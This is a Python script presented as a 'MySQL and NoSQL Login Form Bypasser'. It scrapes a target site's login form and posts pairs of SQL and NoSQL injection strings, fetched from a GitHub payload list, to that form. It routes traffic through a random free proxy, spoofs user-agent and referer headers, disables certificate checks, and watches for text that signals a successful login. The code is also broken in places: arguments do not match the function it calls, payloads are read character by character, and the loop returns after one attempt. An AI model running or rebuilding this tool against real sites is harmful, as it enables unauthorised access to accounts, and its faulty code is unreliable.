#!/usr/bin/python3

import itertools, random, aiohttp, colorama, os, warnings, ssl, re, urllib.parse, asyncio
from pyquery import PyQuery as pq
from fp.fp import FreeProxy

class FormInjector(object):

    def __init__(self):
        warnings.filterwarnings("ignore", category=DeprecationWarning)
        print(f'\x1b]2;[*] MySQL and NoSQL Login Form Bypasser\x07')
        os.system('cls')
        colorama.init()

    async def initial_config(self):
        url = input(f'{colorama.Fore.CYAN}[*] Target URL: ')
        if re.match(r'^https?://', url):
            self.url = url
            await self.scrapeProxies()
            await self.get_field_names()
        else:
            choice = input(f'{colorama.Fore.RED}[*] Invalid URL, Do you want to try again? y/n: ')
            if choice == 'n':
                exit()   
            print(f'{colorama.Fore.RED}[*] Invalid URL')

    @classmethod
    async def scrapeProxies(self):
        try:
            self.proxy = FreeProxy(rand=True).get()
            print(f'{colorama.Fore.CYAN}[*] Proxy: {self.proxy}')
        except Exception as e:
            print(f'{colorama.Fore.RED}[*] Error: {e}')

    async def get_field_names(self):
        try:
            if not re.match(r'^https?://', self.url):
                print(f'{colorama.Fore.RED}[*] Invalid URL')
                exit()
            async with aiohttp.ClientSession() as session:
                async with session.get(self.url) as response:
                    if response.status != 200:
                        print(f'{colorama.Fore.RED}[*] HTTP status code: {response.status}')
                        return
                    else:
                        print(f'{colorama.Fore.CYAN}HTTP status code: {response.status}')
                        html = await response.text()
                        doc = pq(html)
                        form = doc('form')
                        if not form:
                            print(f'{colorama.Fore.RED}[*] Form element not found')
                            return
                        inputs = form('input')
                        for input in inputs:
                            name = input.get('name')
                            id = input.get('id')
                            if name and id:
                                print(f'{colorama.Fore.GREEN}[*] Input field: {name}, Value: {id}')
                            else:
                                print(f'{colorama.Fore.RED}[*] Input field or value not found!')
        except Exception as e:
            print(f'{colorama.Fore.RED}[*] Error: {e}')
        
        await self.check_login(self, self.useragents, self.referers, self.successful_login_confirmations)

    async def check_login(self, url, data, useragents, referers, successful_login_confirmations):
        username = input(f'{colorama.Fore.CYAN}[*] Username: ')
        password = input(f'{colorama.Fore.CYAN}[*] Password: ')

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        async with aiohttp.ClientSession() as session:
            async with session.get('https://raw.githubusercontent.com/bdunlap9/LoginFormBypass/main/useragent.array') as response:
                text = await response.text()
                self.useragents = text.strip()
        
        async with aiohttp.ClientSession() as session:
            async with session.get('https://raw.githubusercontent.com/bdunlap9/LoginFormBypass/main/referrers.array') as response:
                text = await response.text()
                self.referers = text.strip()

        async with aiohttp.ClientSession() as session:
            async with session.get('https://raw.githubusercontent.com/bdunlap9/LoginFormBypass/main/FormInjection.array') as response:
                text = await response.text()
                self.FormInjection = text.strip()

        self.successful_login_confirmations = ['Welcome back!', 'Logged in successfully', 'You are now logged in', 'Successful login', 'Welcome to your account']

        self.lines           = [line.strip() for line in self.FormInjection]
        self.combinations    = list(itertools.combinations(self.lines, 2))
        self.dict_list       = [{f'{username}': combination[0], f'{password}': combination[1]} for combination in self.combinations]

        try:
            for self.data in self.dict_list:
                self.request_data = {
                    **self.data,
                    'User-Agent': random.choice(useragents),
                    'Referer': random.choice(referers)
                }
                data_string = urllib.parse.urlencode(self.data)
                request_data_string = urllib.parse.urlencode(self.request_data)

                data = data_string + '&' + request_data_string

                print(f'{colorama.Fore.YELLOW}[*] Trying: {data}')
                async with aiohttp.ClientSession(aiohttp.TCPConnector(ssl=ssl_context)) as session:
                    async with session.post(url, data=data) as resp:
                        print(f'{colorama.Fore.GREEN}[*] Status: {resp.status}')
                        webpage_content = await resp.text()
                        if any(confirmation in webpage_content for confirmation in successful_login_confirmations):
                            return f'{colorama.Fore.GREEN}[*] Login successful! {data}'
                        else:
                            return
        except Exception as e:
            print(f'{colorama.Fore.RED}[*] Error: {e}')

if __name__ == '__main__':
    form_injector = FormInjector()
    asyncio.run(form_injector.initial_config())
    
